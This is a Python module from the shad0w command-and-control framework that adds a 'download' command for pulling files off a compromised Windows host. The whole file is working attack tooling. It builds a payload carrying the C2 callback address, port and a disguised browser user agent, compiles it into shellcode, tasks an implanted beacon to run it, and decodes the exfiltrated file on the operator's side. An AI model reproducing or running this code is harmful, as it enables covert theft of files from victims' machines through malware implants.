#
# Upload a file
#

import os
import base64
import argparse
import traceback

from lib import buildtools

__description__ = "Download a file from the target machine to shad0ws current directory"
__author__ = "@_batsec_"

EXEC_ID = 0x3000

ERROR = False
error_list = ""

# beacon to exec command on
current_beacon = None

# name of the file to download
FILE_TO_DOWLOAD = ""

# let argparse error and exit nice
def error(message):
    global ERROR, error_list
    ERROR = True
    error_list += f"\033[0;31m{message}\033[0m\n"

def exit(status=0, message=None):
    if message != None: print(message)
    return

def download_callback(shad0w, data):
    global FILE_TO_DOWLOAD

    FILE_TO_DOWLOAD = ''.join(FILE_TO_DOWLOAD)

    shad0w.event.beacon_info(current_beacon, f"Downloading '{FILE_TO_DOWLOAD}' ({len(data)} bytes)\n")

    # change to the dir of the folder mapped to the users current dir
    os.chdir("/root/shad0w/.bridge")

    # os.unlink(FILE_TO_DOWLOAD)

    with open(FILE_TO_DOWLOAD, 'wb') as file:
        file.write(base64.b64decode(data))

    # change the dir to our root
    os.chdir("/root/shad0w/")

    shad0w.event.beacon_info(current_beacon, f"Downloaded")

    return ""


def main(shad0w, args, beacon):
    global FILE_TO_DOWLOAD, current_beacon

    # make beacon global
    current_beacon = beacon

    # usage examples
    usage_examples = """

Examples:

download C:\\Users\\thejoker\\Desktop\\evil_plans.txt
"""

    # init the parser
    parse = argparse.ArgumentParser(prog='download',
                                formatter_class=argparse.RawDescriptionHelpFormatter,
                                epilog=usage_examples)

    # keep it behaving nice
    parse.exit = exit
    parse.error = error

    # setup the args
    parse.add_argument("file", nargs='*', help="File you want to download")

    # make sure we dont die from weird args
    try:
        args = parse.parse_args(args[1:])
    except:
        pass

    # we need a file to read so if we dont then fail
    if len(args.file) == 0:
        print(error_list)
        parse.print_help()
        return

    # save the current dir
    shad0w_cwd = os.getcwd()

    # change to the dir of the folder mapped to the users current dir
    os.chdir("/root/shad0w/.bridge")

    # make this variable global so the call back can access it
    FILE_TO_DOWLOAD = args.file

    # change back to our dir
    os.chdir(shad0w_cwd)

    # clean up the file name
    read_file = ' '.join(args.file).replace('\\', "\\\\").replace('"', '')

    # clone all the source files
    buildtools.clone_source_files(rootdir="/root/shad0w/modules/windows/download/", builddir="/root/shad0w/modules/windows/download/build")

    # get the correct callback details
    if shad0w.teamserver:
        endpoint = shad0w.teamsrv.c2_endpoint
        port     = shad0w.teamsrv.c2_port
    else:
        endpoint = shad0w.endpoint
        port     = shad0w.addr[1]

    # set the correct settings
    template = """#define _C2_CALLBACK_ADDRESS L"%s"
#define _C2_CALLBACK_PORT %s
#define _CALLBACK_USER_AGENT L"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
#define _C2CALLBACK_URI L"/tasks"
#define _POST_HEADER L"Content-Type: application/x-www-form-urlencoded\\r\\n"
#define _HEADER_LEN -1
#define SESSION_ID "%s"
#define DO_CALLBACK 0x4000
#define FILENAME "%s" """ % (endpoint, port, current_beacon, read_file)

    buildtools.update_settings_file(None, custom_template=template, custom_path="/root/shad0w/modules/windows/download/build/settings.h")

    # compile the module
    buildtools.make_in_clone(builddir="/root/shad0w/modules/windows/download/build", modlocation="/root/shad0w/modules/windows/download/module.exe", arch="x64")

    # get the shellcode from the module
    rcode = buildtools.extract_shellcode(beacon_file="/root/shad0w/modules/windows/download/module.exe", want_base64=True)

    # set a task for the current beacon to do
    shad0w.beacons[current_beacon]["callback"] = download_callback
    shad0w.beacons[current_beacon]["task"] = (EXEC_ID, rcode)